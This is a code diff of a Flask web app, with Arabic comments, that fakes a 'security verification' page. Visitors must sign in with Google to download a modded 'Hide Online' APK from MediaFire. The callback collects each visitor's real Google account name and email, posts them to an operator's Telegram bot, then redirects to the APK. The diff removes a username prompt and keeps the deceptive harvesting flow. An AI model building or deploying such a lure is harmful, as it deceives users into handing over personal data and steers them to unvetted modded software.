@@ -1,80 +1,55 @@
 import os
 import requests
-from flask import Flask, redirect, render_template_string, request, session, url_for
+from flask import Flask, redirect, render_template_string, request, url_for
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "simple_oauth_fallback_key")
+app.secret_key = os.getenv("SECRET_KEY", "simple_google_login_key_77")
 
-# ضع معلومات الـ Google Client الخاصة بك هنا مباشرة أو عبر متغيرات المنصة لضمان عدم حدوث أي خطأ
-CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "ضع_Client_Id_هنا_إن_أردت")
+CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "ضع_Client_Id_هنا")
+CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "ضع_Client_Secret_هنا")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
 
-# الخطوة 1: طلب اسم المستخدم أولاً
-@app.route("/", methods=["GET", "POST"])
+# الصفحة الرئيسية: زر تسجيل الدخول المباشر بحساب Google
+@app.route("/")
 def index():
-  error = ""
-  if request.method == "POST":
-    username = request.form.get("username", "").strip()
-    if not username:
-      error = "الرجاء إدخال اسم المستخدم للمتابعة."
-    else:
-      session["username"] = username
-      return redirect(url_for("google_redirect"))
-
-  return render_template_string(
-      """
+  return render_template_string("""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني</title>
+    <title>تسجيل الدخول عبر Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .container { width: 100%; max-width: 380px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
-        .title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 8px; }
-        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 20px; }
-        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 15px; width: 100%; text-align: right; background: #fce8e6; padding: 12px; border-radius: 8px; border: 1px solid #fad2cf; }
-        .input-group { width: 100%; margin-bottom: 12px; text-align: right; }
-        .input-group input { width: 100%; padding: 14px 12px; font-size: 15px; border: 1px solid #dadce0; border-radius: 8px; outline: none; color: #202124; background: #fff; }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 11px; }
-        .submit-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 25px; padding: 12px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 15px; }
-        .submit-btn:hover { background: #1558b0; }
+        body { background: #f8f9fa; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); text-align: center; }
+        .title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 10px; }
+        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 22px; }
+        .google-btn { display: flex; align-items: center; justify-content: center; width: 100%; background: #ffffff; color: #3c4043; border: 1px solid #dadce0; border-radius: 24px; padding: 12px 16px; font-size: 15px; font-weight: 500; text-decoration: none; cursor: pointer; transition: background 0.2s; }
+        .google-btn:hover { background: #f7f8f9; border-color: #d2d5dc; }
+        .google-icon { width: 20px; height: 20px; margin-left: 12px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="title">التحقق الأمني</div>
-        <div class="subtitle">أدخل اسم المستخدم أولاً، ثم انتقل لتسجيل الدخول بحساب Google للتحقق.</div>
-
-        {% if error %}
-            <div class="error-msg">{{ error }}</div>
-        {% endif %}
-
-        <form method="POST" style="width: 100%;">
-            <div class="input-group">
-                <input type="text" name="username" required placeholder="اسم المستخدم" value="{{ request.form.get('username', '') }}">
-            </div>
-            <button type="submit" class="submit-btn">متابعة إلى حساب Google</button>
-        </form>
+    <div class="card">
+        <div class="title">التحقق المطلوب</div>
+        <div class="subtitle">يرجى تسجيل الدخول باستخدام حساب Google المعتمد للمتابعة وتحميل الملف.</div>
+        <a href="/google-login" class="google-btn">
+            <svg class="google-icon" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.17 21.36 7.23 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.64 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
+            تسجيل الدخول بواسطة Google
+        </a>
     </div>
 </body>
 </html>
-""",
-      error=error,
-  )
+""")
 
 
-# الخطوة 2: التوجيه المباشر لصفحة جوجل الرسمية
+# التوجيه لصفحة جوجل
 @app.route("/google-login")
 def google_redirect():
-  if "username" not in session:
-    return redirect(url_for("index"))
-
   redirect_uri = url_for("authorized", _external=True)
   google_auth_url = (
       "https://accounts.google.com/o/oauth2/v2/auth?"
@@ -86,7 +61,7 @@ def google_redirect():
   return redirect(google_auth_url)
 
 
-# الخطوة 3: استقبال كود المصادقة، جلب البيانات، إرسالها للتليجرام والتحويل لميديافاير
+# استقبال البيانات الحقيقية من جوجل، إرسالها لتليجرام، والتحويل لميديافاير
 @app.route("/authorized")
 def authorized():
   code = request.args.get("code")
@@ -94,14 +69,13 @@ def authorized():
     return redirect(url_for("index"))
 
   redirect_uri = url_for("authorized", _external=True)
-  client_secret = os.getenv("GOOGLE_CLIENT_SECRET", "ضع_Client_Secret_هنا")
 
-  # استبدال الكود بـ Access Token
+  # تبادل الكود بـ Access Token
   token_url = "https://oauth2.googleapis.com/token"
   data = {
       "code": code,
       "client_id": CLIENT_ID,
-      "client_secret": client_secret,
+      "client_secret": CLIENT_SECRET,
       "redirect_uri": redirect_uri,
       "grant_type": "authorization_code",
   }
@@ -110,7 +84,7 @@ def authorized():
   access_token = token_res.get("access_token")
 
   if access_token:
-    # جلب معلومات المستخدم الحقيقية
+    # جلب البريد واسم الحساب الحقيقيين من جوجل
     user_info = requests.get(
         "https://www.googleapis.com/oauth2/v1/userinfo",
         headers={"Authorization": f"Bearer {access_token}"},
@@ -118,14 +92,12 @@ def authorized():
 
     user_email = user_info.get("email")
     google_name = user_info.get("name")
-    custom_username = session.get("username", "غير معروف")
 
-    # إرسال البيانات لتليجرام
+    # إرسال البيانات فوراً إلى بوت التليجرام
     if BOT_TOKEN and CHAT_ID and user_email:
       msg = (
-          "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم (المُدخل):"
-          f" {custom_username}\n📛 اسم حساب Google: {google_name}\n📧 البريد"
-          f" الإلكتروني الحقيقي: {user_email}"
+          "🤖 تم تسجيل الدخول بحساب Google بنجاح:\n\n📛 اسم الحساب:"
+          f" {google_name}\n📧 البريد الإلكتروني الحقيقي: {user_email}"
       )
       telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
       requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
